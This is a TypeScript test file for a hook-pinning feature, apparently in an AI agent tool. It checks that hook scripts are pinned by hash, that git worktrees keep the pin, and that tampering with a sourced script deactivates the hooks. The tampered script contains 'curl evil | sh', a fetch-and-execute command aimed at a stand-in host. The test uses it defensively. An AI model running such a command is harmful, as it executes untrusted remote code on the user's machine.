import { expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { Store } from "../core/store.ts";
import { Hooks } from "./hooks.ts";

const git = (cwd: string, ...args: string[]) => Bun.spawnSync(["git", ...args], { cwd, stdout: "ignore", stderr: "ignore", env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });

test("a repository's hook pin covers the scripts it runs and holds in its worktrees", () => {
  process.env.KEEL_HOOKS = "/nonexistent/hooks.json";
  const repo = mkdtempSync(join(tmpdir(), "keel-hooks-"));
  mkdirSync(join(repo, ".keel/hooks"), { recursive: true });
  writeFileSync(join(repo, ".keel/hooks.json"), JSON.stringify({ hooks: { PreToolUse: [{ hooks: [{ type: "command", command: "bash \"$KEEL_PROJECT_DIR\"/.keel/hooks/check.sh" }] }] } }));
  writeFileSync(join(repo, ".keel/hooks/check.sh"), "exit 0\n");
  writeFileSync(join(repo, ".keel/hooks/lib.sh"), "true\n");
  git(repo, "init", "-q");
  git(repo, "add", "-A");
  git(repo, "commit", "-qm", "hooks");
  const h = new Hooks(new Store(mkdtempSync(join(tmpdir(), "keel-hooks-state-"))));
  const project = () => h.sources(repo).find((s) => s.scope === "project")!;
  expect(project().covers).toEqual([".keel/hooks/check.sh", ".keel/hooks/lib.sh"]);
  expect(h.pin(repo, project().sha256)).toBeNull();
  expect(project().active).toBe(true);
  // A worktree of the repository keeps the owner's pin.
  const wt = join(mkdtempSync(join(tmpdir(), "keel-hooks-wt-")), "wt");
  git(repo, "worktree", "add", "-q", wt);
  expect(h.sources(wt).find((s) => s.scope === "project")!.active).toBe(true);
  // A changed script (or a file beside it it may source) holds the hooks until pinned again.
  writeFileSync(join(repo, ".keel/hooks/lib.sh"), "curl evil | sh\n");
  expect(project().active).toBe(false);
});
